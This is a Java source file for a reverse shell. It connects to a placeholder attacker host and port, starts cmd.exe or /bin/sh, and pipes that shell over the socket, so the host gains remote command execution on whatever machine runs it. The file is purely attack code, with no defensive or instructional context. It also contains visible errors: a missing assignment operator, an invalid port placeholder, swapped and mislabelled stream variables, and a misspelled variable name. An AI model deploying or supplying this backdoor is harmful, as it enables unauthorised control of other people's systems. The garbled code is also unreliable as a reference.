//ReverseShell.java

import java.io.*;

import java.net.*;

public class ReverseShell {

public static void main(String[] args) throws Exception {

String host = "attacker_ip";

int port = attacker_port;

Socket socket = new Socket(host, port);

String shell = System.getProperty("os.name").startsWith("Windows") ? "cmd.exe" : "/bin/sh ";

Process process new ProcessBuilder (shell).redirectErrorStream(true).start();

InputStream processIn =  process.getErrorStream(), socketIn =  process.getInputStream(), processErr = socket.getInputStream();

OutputStream process0ut =  process.getOutputStream(), socketOut =

socket.getOutputStream();

while (!socket.isClosed()) {

while (processIn.available() > 0) socketOut.write(processIn.read());

while (processErr.available() > 0) socketOut.write(processErr.read());

while (socketIn.available() > 0) processOut.write(socketIn.read());

socketOut.flush();

processOut.flush();

Thread.sleep(50);

try { process.exitValue(); break; } catch (Exception e) {}

}

process.destroy();

socket.close();

}

}